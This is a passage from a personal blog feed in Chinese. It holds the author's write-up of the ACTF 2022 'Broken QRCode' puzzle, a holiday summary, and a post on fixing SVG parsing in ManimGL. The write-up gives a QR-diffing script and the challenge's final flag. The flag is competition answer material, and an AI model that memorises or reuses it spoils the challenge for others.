<span class="string">&quot;A full commitment&#x27;s what I&#x27;m thinking of&quot;</span>,</span><br><span class="line">    <span class="string">&quot;You wouldn&#x27;t get this from any other guy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;I just wanna tell you how I&#x27;m feeling&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Gotta make you understand&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna give you up&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna let you down&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna run around and desert you&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna make you cry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna say goodbye&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna tell a lie and hurt you&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, content <span class="keyword">in</span> <span class="built_in">enumerate</span>(rick):</span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(<span class="string">f&quot;qrcodes/<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    img2 = make(content, version=<span class="number">5</span>, error_correction=ERROR_CORRECT_H).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    cropped_img1 = img1.crop(ImageOps.invert(img1).getbbox())</span><br><span class="line">    cropped_img2 = img2.crop(ImageOps.invert(img2).getbbox()).resize(cropped_img1.size)</span><br><span class="line">    ImageChops.difference(cropped_img1, cropped_img2).save(<span class="string">f&quot;diff/<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/12a2afd2/diffs.png"></p><p>Now we get the first part of the flag. So the flag is <strong>ACTF{Y0u_Re41Ly_kn0w_QRCod3}</strong></p></details><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>翔鸽最近好像在筹备一个二维码的视频，在开发时不小心在群里泄露了题目，虽然及时撤回了，但还是从群里的 bot 日志翻到了以下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2022-06-24 13:57:24 V/Bot.3559109703: [Project QRCode(xxx)] 鹤翔万里(xxx) -&gt; 刚写完了二维码生成器，但是好像写出 bug 了，扫描不了，你们看看？</span><br><span class="line">2022-06-24 13:57:50 V/Bot.3559109703: [Project QRCode(xxx)] 鹤翔万里(xxx) -&gt; [mirai:image:&#123;AA8F922E-7A7C-886E-F54C-E82D73F614D8&#125;.jpg]</span><br><span class="line">2022-06-24 13:58:26 V/Bot.3559109703: [Project QRCode(xxx)] 鹤翔万里(xxx) -&gt; 草</span><br><span class="line">2022-06-24 13:58:58 V/Bot.3559109703: [Project QRCode(xxx)] 鹤翔万里(xxx) -&gt; 才反应过来，这可不兴看啊，里面是要给 ACTF 出的题来着（</span><br><span class="line">2022-06-24 13:59:06 V/Bot.3559109703: [Project QRCode(xxx)] 鹤翔万里(xxx) -&gt; 撤了撤了（</span><br></pre></td></tr></table></figure><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先，题目只有这些文字内容，显然首要的目标是得到那个撤回了的图片，根据 mirai QQ 机器人记录下的图片 uuid 套入官方的接口就可以得到那张图片的 url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchat.qpic.cn/gchatpic_new/0/0--AA8F922E7A7C886EF54CE82D73F614D8/0</span><br></pre></td></tr></table></figure><p>访问得到图片：<br><img src="/p/12a2afd2/qq.jpg"><br>再由题目中的 Broken 以及信息 “写的二维码生成器出 bug 了，扫不了”，并且经过简单的分析可以看到二维码开头四个 bit、紧跟着的大小，以及中间的 padding 都是裸露在外的，所以可以推测是没有进行掩码操作（也可以通过第一个 hint “I broke this QR code by just missing a step“ 确定这一点）</p><p>将图片载入 <a href="https://merricx.github.io/qrazybox/">qrazybox</a>，打上一层掩码就可以直接扫描了，得到 <a href="https://gist.github.com/TonyCrane/88dba1fb35297fef2b195495447a8a93">https://gist.github.com/TonyCrane/88dba1fb35297fef2b195495447a8a93</a> ，里面是一个压缩包十六进制的字符串，存下来解压，得到十二个二维码：</p><p><img src="/p/12a2afd2/qrcodes.png"></p><p>扫描得到的结果是 Rickroll 歌词，而且均是完全的纯文本，没有内容上的把戏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">We&#x27;re no strangers to love</span><br><span class="line">You know the rules and so do I</span><br><span class="line">A full commitment&#x27;s what I&#x27;m thinking of</span><br><span class="line">You wouldn&#x27;t get this from any other guy</span><br><span class="line">I just wanna tell you how I&#x27;m feeling</span><br><span class="line">Gotta make you understand</span><br><span class="line">Never gonna give you up</span><br><span class="line">Never gonna let you down</span><br><span class="line">Never gonna run around and desert you</span><br><span class="line">Never gonna make you cry</span><br><span class="line">Never gonna say goodbye</span><br><span class="line">Never gonna tell a lie and hurt you</span><br></pre></td></tr></table></figure><p>经过分析可以发现第一张图片的结尾有附加数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">410314c795f6b6e30775f5152436f64337d0ec187c229c4d4a44</span><br><span class="line"># to binary</span><br><span class="line">0100000100000011000101001100011110010101111101101011011011100011000001110111010111110101000101010010010000110110111101100100001100110111110100001110110000011000011111000010001010011100010011010100101001000100</span><br></pre></td></tr></table></figure><p>再通过本题主要考点为二维码，所以不难推测这是一段二维码填充内容的比特序列（包括标识符、大小、序列、padding、纠错码），解析出来的结果是 <code>1Ly_kn0w_QRCod3&#125;</code>，即 flag 的后半段</p><p>那么前半段的 flag 就要从那十二个二维码中获得了</p><p>因为除了第一张图片以外，没有任何的图片隐写，所以问题应该就出在二维码自身上。通过很多工具都可以发现这些二维码中存在错误，扫描时都是靠纠错码来纠错得到的正确内容，所以便是通过纠错的特性隐藏了一些更改</p><p>最直接的解法是利用里的所罗门编码纠错，找到错误的比特，再反推到图上。但这样有些过于复杂</p><p>既然每个二维码的内容已知，版本号、纠错等级、掩码编号、编码方式都已知，那么最后的二维码是唯一确定的，所以只要生成一个正确的二维码再和题给的二维码逐个 diff 就可以找到被更改的点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qrcode <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageOps, ImageChops</span><br><span class="line"></span><br><span class="line">rick = [</span><br><span class="line">    <span class="string">&quot;We&#x27;re no strangers to love&quot;</span>,</span><br><span class="line">    <span class="string">&quot;You know the rules and so do I&quot;</span>,</span><br><span class="line">    <span class="string">&quot;A full commitment&#x27;s what I&#x27;m thinking of&quot;</span>,</span><br><span class="line">    <span class="string">&quot;You wouldn&#x27;t get this from any other guy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;I just wanna tell you how I&#x27;m feeling&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Gotta make you understand&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna give you up&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna let you down&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna run around and desert you&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna make you cry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna say goodbye&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Never gonna tell a lie and hurt you&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, content <span class="keyword">in</span> <span class="built_in">enumerate</span>(rick):</span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(<span class="string">f&quot;qrcodes/<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    img2 = make(content, version=<span class="number">5</span>, error_correction=ERROR_CORRECT_H).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    cropped_img1 = img1.crop(ImageOps.invert(img1).getbbox())</span><br><span class="line">    cropped_img2 = img2.crop(ImageOps.invert(img2).getbbox()).resize(cropped_img1.size)</span><br><span class="line">    ImageChops.difference(cropped_img1, cropped_img2).save(<span class="string">f&quot;diff/<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/12a2afd2/diffs.png"></p><p>即得到 flag 的前半部分，所以 flag: <strong>ACTF{Y0u_Re41Ly_kn0w_QRCod3}</strong></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最后十二个二维码的修改是我在 qrazybox 里手动盲点的，导致最后一个二维码改错了没发现。比赛前一天写了 exp 跑了下才发现最后一个图点错了，于是直接重新改了一次，也懒得改其它的了。导致最后一个图的大小、位置等都和前面不一样。后来放了 hint 说了这个没有关系，但是貌似还是有很多师傅在最后一张图上盯了好久，给各位师傅道歉了呜呜呜 Orz</p><p>这题我感觉出的不是很难，没有刁钻地考二维码的东西（外面的一层也只是少了个掩码而已，没有什么裁剪啊，乱序啊，打马赛克啊一系列的骚操作），看到反馈有些师傅卡在了前半段，有些卡在了后半段，感觉都挺奇妙（特别是后半段，本来应该再构造一下的，比如穿插段数字模式编码啊什么的，这次完全用了字节模式，导致做一些移位就可以直接暴露出中间的内容，并不需要了解到这也和二维码有关</p><p>也可能是做的人少的原因，最后只有 L3H 一个队解出来了，蛮巧的是我也是在 L3HCTF 那场比赛的 cropped 题目之后才详细地学习了二维码，给 L3H 的师傅跪了 OTZ</p><p>总之感谢各位师傅参与这场比赛，希望这道题你们能喜欢 (￣▽￣)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;6 月 25～27 号我们 AAA 战队承办了一场 ACTF 比赛，我出了 Broken QRCode 这一道题目，这里是 writeup&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「生活」2022 寒假总结</title>
    <link href="https://blog.tonycrane.cc/p/78cef964.html"/>
    <id>https://blog.tonycrane.cc/p/78cef964.html</id>
    <published>2022-02-16T07:47:55.000Z</published>
    <updated>2022-06-28T06:13:30.648Z</updated>
    
    <content type="html"><![CDATA[<p>一个月的寒假这么快就过完了，闲来无聊，还是写点东西记录一下这个假期干的事情吧 _(:з」∠)_</p><p>手机里的待办一点点变多，然后又一点点变少（<del>不想干了/不会做了，所以删了，乐</del>），总归还是做了点东西的</p><span id="more"></span><h2 id="摸鱼方面"><a href="#摸鱼方面" class="headerlink" title="摸鱼方面"></a>摸鱼方面</h2><p>当然还是先写点轻松愉快的</p><p>这个假期玩<del>通</del>了两个游戏，很像，也很震撼，很能给我惊喜</p><h3 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba is you"></a>baba is you</h3><p>也算是经典游戏了（？<br>在几次 CTF 里都见到了以 baba 为背景的游戏，所以就打算来玩一玩原版了</p><p>直播打了好几次，关卡越来越多，又不断解锁新玩法，新的隐藏地图，在隐藏地图里又开启一个另一个隐藏的地图<br>烧脑，但是好玩，打通了又很有成就感<br><img src="/p/78cef964/baba.jpg"><br>打通之后才发现还有两个官方关卡包，还有更多新玩法，又要继续肝了（这游戏买的真的值2333</p><h3 id="文字游戏"><a href="#文字游戏" class="headerlink" title="文字游戏"></a>文字游戏</h3><p>在打 baba is you 的时候才听说的，打了预览版还挺有意思，就开始等发售了</p><p>发售当晚买了下来，从七点一直直播打到凌晨两点，打通了（其实没有）<br>玩法当然新奇又有趣，剧情也超赞，而且 be 后的反转也搞得我浑身鸡皮疙瘩（<del>是不是说太多了</del></p><p>之后隔了一天，又继续打了二周目，这回解锁了真结局，真的感动<br>然后去搞到了全成就<br>这个游戏就完结了<br><img src="/p/78cef964/wordgame.jpg"><br>说多了剧透，反正强推就完事了</p><h3 id="番-剧-电影"><a href="#番-剧-电影" class="headerlink" title="番/剧/电影"></a>番/剧/电影</h3><p>这个学期补完了 EVA TV 版和旧剧场版<br>怕影响考试周，就没再接着看新剧场版<br>这个假期又是看 B 站又是找资源，看完了 序、Q、破、终 新剧场版<br>虽然依旧一脸懵逼，但是回味一下，还是很好的</p><p>我是个从来不看剧的人，但是在 GZTime 和同学的推荐下还是去看了《开端》<br>算是颠覆了我对电视剧的认识（毕竟是网文改<br>第一晚上看了三集上头了，第二天直接从吃完晚饭看到凌晨两点多一口气看完了<br>剧情没得说，演技也全员在线（<del>除了准备药检2333</del>）<br>牛的</p><p>电影嘛，电影院新上映的一部也没看<br>在 B 站补了《烈日灼心》《我们的父辈》<br>都相当好了（嗯.jpg<br><del>语言能力尚未达到人类标准，不详细评价了</del></p><h2 id="技术方面"><a href="#技术方面" class="headerlink" title="技术方面"></a>技术方面</h2><h3 id="Notebook"><a href="#Notebook" class="headerlink" title="Notebook"></a>Notebook</h3><p>起因是看到了 <a href="https://github.com/zjuchenyuan">chenyuan</a> 大佬的 <a href="https://blog.chenyuan.me/">notebook</a>，群友 <a href="https://github.com/zmx0142857">fran (zmx0142857)</a> 的 <a href="https://zmx0142857.gitee.io/note/">note</a>，还有 <a href="https://github.com/widcardw">widcardw</a> 的个人笔记。<br>都很全、很震撼、很羡慕<br>而且感觉自己好像也缺一个这样的东西，好多学到的东西不进脑子，学完就忘，还要到原来的地方再查一遍<br>于是就也自己开始拿 mkdocs 搭了一个，链接在：<a href="https://note.tonycrane.cc/">https://note.tonycrane.cc/</a><br><img src="/p/78cef964/note.jpg"></p><p>在这个博客之前用的也是 mkdocs，所以还是比较熟悉的<br>但是这次又详细地看了 mkdocs、pymarkdown、material 的文档，感觉 pymarkdown 的特性要比 hexo 的渲染器多得多，功能也多，调整空间也很大<br>material 增加的特性也很多很好用，香的一批，写的也舒适</p><p>为了和这个博客的主题匹配，我花了很长时间来重写了字体样式和配色主题，然后又从 <a href="https://facelessuser.github.io/pymdown-extensions/">pymdown-extensions 的文档</a><del>抄</del>学来了暗色主题和按钮的配置（比我当时给这个博客瞎写的高到不知道哪里去了2333）</p><p>搭完了之后又补充了很多东西进去，把这个博客里曾经写过的一些系列文章和 writeup 丢了进去，现在看上去还是比较完善了</p><p>这个 mkdocs 的 repo 也公开了，在 <a href="https://github.com/TonyCrane/note/">TonyCrane/note</a>，<del>快去 Star</del></p><h3 id="Q-群机器人"><a href="#Q-群机器人" class="headerlink" title="Q 群机器人"></a>Q 群机器人</h3><p>mk 的闲聊群里有一个机器人喵呜，很好玩（很可爱），打算自己也写一个玩一玩</p><p>然后在 GitHub 上逛到了 <a href="https://github.com/djkcyl/ABot-Graia">djkcyl/ABot-Graia</a> 这个项目，就去看了看 mirai 和 girai-ariadne<br>随手写了写，加了点类似显示 B 站视频信息、复读、咕咕咕、生成图片表情包、查天气、渲染 LaTeX、查 cdecl 之类的功能，写了一坨屎山<br>然后跑了起来，加到班级群里反响还不错，同学玩得都挺有意思（</p><p>之后又去看了 girai-saya，整理了结构，又写了最近大火的 wordle、handle 两个游戏，都放到了服务器上跑了<br>（虽然但是，这也是第一次用 screen，第一次用 vsc ssh 远程连接服务器，<del>老火星人了</del>）</p><p>现在代码还很乱，或许以后收拾收拾也扔到 GitHub 上（？</p><h3 id="ManimGL"><a href="#ManimGL" class="headerlink" title="ManimGL"></a>ManimGL</h3><p>本来是打算这个假期用 manim 做视频来着，结果却变成了修 manim / 改 manim<br><img src="/p/78cef964/manimgl.jpg"><br>总共开了 7 个 pull request，review 了 13 个 pr，发了 3 个 release<br>鸽兰特也给力，基本上 review 之后的当晚十二点就会给 merge</p><p>主要干的事呢，有两个</p><ul><li>修 SVGMobject，之前也专门发过文章 <a href="/p/81940d35.html">修复 ManimGL 中的 SVGMobject</a>，学到的 SVG 也放到了 <a href="https://note.tonycrane.cc/cs/web/svg/">notebook</a> 里。基本上完善了基本的 SVG 需要，包括样式和复杂路径的处理（虽然之后<a href="https://github.com/YishiMichael">忆拾</a>用<a href="https://github.com/3b1b/manim/pull/1731">更好的方法</a>(指调库)来改进了 SVGMobject）</li><li>写类型注解，主要是为了方便用 vsc 的时候提示，以及方便后续写文档。就花了三天多时间爆肝，给 ManimGL 里的所有类方法、函数都添加了类型注解，在 <a href="https://github.com/3b1b/manim/pull/1736">#1736</a> 这个 pr 里，竟然写了 2791+ 1401-，我都觉得不可思议（</li></ul><p><img src="/p/78cef964/1736.png"><br>大概还需要很长时间来检查，然后再 merge<br>之后还打算给所有文件添加 __all__，然后规范一下代码格式，再根据一些网站改进一下代码质量<br>鸽了，有时间就搞 _(:з」∠)_</p><h2 id="任务方面"><a href="#任务方面" class="headerlink" title="任务方面"></a>任务方面</h2><h3 id="暖冬宣讲"><a href="#暖冬宣讲" class="headerlink" title="暖冬宣讲"></a>暖冬宣讲</h3><p>算是这个假期的一个主要任务（？<br>宣讲队一共六个人，也不是太打得起精神<br>就边摆边干活，糊弄糊弄过去了</p><p>虽然但是，效果看上去还是可以的，群里收了 350+ 人，宣讲线上会议也有 110+ 人在听<br>希望没有给浙大丢脸（笑</p><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p>新的一期视频打算和 GZTime、NanoApe 一起讲二维码<br>然后刚考完试就去看了 QRCode 这个包<br>然后按照自己的习惯拿 manim 重写了一个二维码生成器<br>又改了改就成为了新视频的轮子</p><p>之后开始写文案<br>和 GZTime 讨论了一下整体的安排之后花了两天写完了全部的文案（“两天”，其中穿插了打 baba、打文字游戏、看开端，乐）<br>大概 260 条，5k+ 字左右</p><p>然后做了第一个场景之后<del>累了</del>，就鸽了，留着慢慢做</p><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>假期也没打几场比赛，HGAME 没参加，RealWorldCTF 没起到什么作用</p><p>VNCTF 个人赛倒是打了打，太拉垮了，所以 writeup 就没往这里发，扔到 note 里留着了：<a href="https://note.tonycrane.cc/writeups/vnctf2022/">VNCTF 2022 Writeup</a></p><h2 id="生活方面"><a href="#生活方面" class="headerlink" title="生活方面"></a>生活方面</h2><p>正常过了个年（此处略去……）</p><p><del>作息还是没调整过来，天天一点多睡，早上十点多醒</del>（悲）</p><h2 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h2><p>？<br>？？<br>寒假学什么习<br>数分线代想重学，没学上<br>汇编语言也没完整看完一遍<br>下学期的数逻也一点也没看上<br>Rust 想重新学好久了，也没学上</p><p>我怎么这么弱啊.jpg</p><p>shya 次一定，shya 次一定</p><hr><p>这么一看这个假期做的事情还是挺多的？(´▽｀)<br>马上开学了，希望我能从一大堆硬课和南方的气候中活下来 _(´ཀ`」 ∠)__ </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一个月的寒假这么快就过完了，闲来无聊，还是写点东西记录一下这个假期干的事情吧 _(:з」∠)_&lt;/p&gt;
&lt;p&gt;手机里的待办一点点变多，然后又一点点变少（&lt;del&gt;不想干了/不会做了，所以删了，乐&lt;/del&gt;），总归还是做了点东西的&lt;/p&gt;</summary>
    
    
    
    <category term="生活" scheme="https://blog.tonycrane.cc/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="生活" scheme="https://blog.tonycrane.cc/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>修复 ManimGL 中的 SVGMobject</title>
    <link href="https://blog.tonycrane.cc/p/81940d35.html"/>
    <id>https://blog.tonycrane.cc/p/81940d35.html</id>
    <published>2022-01-25T15:18:14.000Z</published>
    <updated>2022-02-16T07:45:57.544Z</updated>
    
    <content type="html"><![CDATA[<p>今天一天都在修 ManimGL 里的 SVGMobject，还是比较有收获的，写篇文章记录一下<br>起因是 fran 给了一个在 ManimGL 里表现怪异的 svg 文件：<a href="/81940d35/formula.svg">formula.svg</a></p><span id="more"></span><p>它在 ManimGL 下表现的是：<br><img src="/p/81940d35/formula.png"><br>不难发现几个问题：</p><ul><li>整体上下翻转了</li><li>左边多了一条粗线</li><li>矩阵大括号中间断开了</li><li>角标没有缩放，不在正确位置上</li></ul><p>通过检查 svg 源码可以发现主要是两个问题，一个是直接从嵌套在内层的 svg 元素中提取出了物件，二是没有正确处理 svg 的 transform</p><h2 id="只从最外层-svg-提取物件"><a href="#只从最外层-svg-提取物件" class="headerlink" title="只从最外层 svg 提取物件"></a>只从最外层 svg 提取物件</h2><p>这个问题产生的原因是在 <code>SVGMobject.init_points</code> 这个方法中，原来的代码是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">doc = minidom.parse(self.file_path)</span><br><span class="line">self.ref_to_element = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> svg <span class="keyword">in</span> doc.getElementsByTagName(<span class="string">&quot;svg&quot;</span>):</span><br><span class="line">    mobjects = self.get_mobjects_from(svg)</span><br><span class="line">    <span class="keyword">if</span> self.unpack_groups:</span><br><span class="line">        self.add(*mobjects)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.add(*mobjects[<span class="number">0</span>].submobjects)</span><br><span class="line">doc.unlink()</span><br></pre></td></tr></table></figure><p>很明显，这里的 for 循环提取了全部的 svg 标签，然后从中提取出 mobjects</p><p>但是这样的话如果有嵌套在 svg 内部的 svg 就也会从中提取 mobjects，但这时就没有了外层的约束，导致重复生成，而且生成的位置错误</p><blockquote><p>在上面那个 svg 中就是这样，大括号分为三个部分，其中中间的一段是复用了一个元素，并且使用的是 svg 标签</p></blockquote><p>解决方法也很直接，直接遍历 doc 的子节点 childNodes，并且判断其 tagName 是否是 “svg”，不是就跳过<br>但这样仍存在一个问题，doc 的子节点可能不是 Element，比如注释，就是 Comment，它并没有 tagName 属性，所以还需要先判断一下这个节点是不是 Element</p><p>最终的解决办法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> doc.childNodes:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(child, minidom.Element): <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> child.tagName != <span class="string">&#x27;svg&#x27;</span>: <span class="keyword">continue</span> </span><br><span class="line">    mobjects = self.get_mobjects_from(child)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="正确处理-transforms"><a href="#正确处理-transforms" class="headerlink" title="正确处理 transforms"></a>正确处理 transforms</h2><p>上面 svg 中，角标没有缩放、放到正确位置的原因是，这两个操作在这个 svg 中都使用了 transform 来达成，所以它的值是 “translate(…) scale(…)”，前者负责平移，后者负责缩放</p><p>但是 ManimGL 中原来的处理方法是直接使用 “matrix(…)” “translate(…)” “scale(…)” 进行匹配，将中间内容当作参数，如果中途任何环节出现报错，都直接忽略掉<br>但是这样它会将这个 transform 解析成参数为 “…) scale(…” 的一个 translate，这显然会在后面抛出异常</p><p>然后就尝试了使用空格分割<br>效果倒是出现了，但是还是有一点问题，角标距离元素的距离太近，对比发现，可能是因为缩放和平移的施加顺序不同导致的</p><p>svg 标准中也有说明，transform 应该从右向左依次施加，所以临时的修正写法是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">transforms = element.getAttribute(<span class="string">&#x27;transform&#x27;</span>).split(<span class="string">&quot; &quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> transform <span class="keyword">in</span> transforms:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>但是这样也有问题，因为标准中对于 transform 串的规定很宽松，两个 transform 中间可以不加空格，也可以有任意多空格，名字和左括号中间也可以有空格……</p><p>然后参考了 ManimCE，发现了里面有一个链接，是一个 python 写的 svg 解析器：<a href="https://github.com/cjlano/svg">https://github.com/cjlano/svg</a></p><p>按照里面的写法，使用了正则表达式来匹配名称和参数，根据规范，svg 仅支持 css transform 中的 matrix translate scale rotate skewX skewY，但我顺手还加了 translateX/Y scaleX/Y<br>全部的正则和匹配方法是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">transform_names = [</span><br><span class="line">    <span class="string">&quot;matrix&quot;</span>, </span><br><span class="line">    <span class="string">&quot;translate&quot;</span>, <span class="string">&quot;translateX&quot;</span>, <span class="string">&quot;translateY&quot;</span>, </span><br><span class="line">    <span class="string">&quot;scale&quot;</span>, <span class="string">&quot;scaleX&quot;</span>, <span class="string">&quot;scaleY&quot;</span>, </span><br><span class="line">    <span class="string">&quot;rotate&quot;</span>, </span><br><span class="line">    <span class="string">&quot;skewX&quot;</span>, <span class="string">&quot;skewY&quot;</span></span><br><span class="line">]</span><br><span class="line">transform_pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;|&quot;</span>.join([x + <span class="string">r&quot;[^)]*\)&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> transform_names]))</span><br><span class="line">number_pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;[-+]?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][-+]?\d+)?&quot;</span>)</span><br><span class="line">transforms = transform_pattern.findall(element.getAttribute(<span class="string">&#x27;transform&#x27;</span>))[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> transform <span class="keyword">in</span> transforms:</span><br><span class="line">    op_name, op_args = transform.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    op_name = op_name.strip()</span><br><span class="line">    op_args = [<span class="built_in">float</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> number_pattern.findall(op_args)]</span><br></pre></td></tr></table></figure><p>其中第一个正则表达式很显然，匹配每一个名称，后面接任意多个非右括号的字符，然后是右括号<br>第二个字符比较复杂，可视化后还是比较清晰的：<br><img src="/p/81940d35/regex.png"><br>然后根据标准依次解决就好了：</p><ul><li>matrix 直接保留原来写好的就可以</li><li>translate 平移，translateX 时 y=0，translateX 时 x=0</li><li>scale 缩放，注意可能有负的情况，但是 ManimGL 已经禁止 scale 的时候 factor 小于等于 0，所以需要先 flip 一下（这也是为什么上面的公式上下颠倒了，因为有一个 scale(1, -1) 没有施加）</li><li>rotate 旋转，和 css 里不一样，这里的角度单位都是 deg，并且省去了 deg，而且可能会接受 3 个参数，这时后两个会做为一个坐标，表示旋转的中心点</li><li>skewX skewY 倾斜，可以直接转为 matrix：<ul><li>skewX(a): [1., 0., tana, 1., 0., 0.]</li><li>skewY(a): [1., tana, 0., 1., 0., 0.]</li></ul></li></ul><p>这之后上面的 svg 就可以正确渲染了：<br><img src="/p/81940d35/formula_.png"></p><hr><p>但是这之后还是有 bug，其中一个是老问题，在 path 元素的 string 中，有些时候会省略掉空格，导致原来的 ManimGL 无法处理，另一个是当 M 指令后紧接着 S 指令时，会因为点集内只有一个点而引起错误</p><h2 id="正确解析-path-string"><a href="#正确解析-path-string" class="headerlink" title="正确解析 path string"></a>正确解析 path string</h2><p>这个问题使用上面的那个正则表达式可以解决一部分，但是还有一个神奇的情况：两个 0 连着出现，也就是 “00”<br>这时后上面的正则会认为这是一个 0.0，而实际上，这是两个 0.0 并在了一起</p><p>然后 fran 改了改正则，在前面加了 “0|” 解决了这个问题</p><p>但是另一个更神奇的情况出现了：<code>A1.098 1.098 0 11.777 1.875z</code><br>看到这个第一反应肯定是五个数对吧，但是 A 指令只接受七个数</p><p>看了浏览器解析的结果后发现，参数实际上是 1.098 1.098 0 1 1 0.777 1.875<br>而这个是 1 1 .777 三个数而不是 11.777 一个数的原因是，A 指令的第 4、5 个参数是 flag，一定是 0 或 1</p><p>这样的话使用正则就很复杂了<br>一顿查找后发现了另一个解析 svg path 的库：<a href="https://github.com/regebro/svg.path/">https://github.com/regebro/svg.path/</a></p><p>按照里面的思路，重新写了一个 path 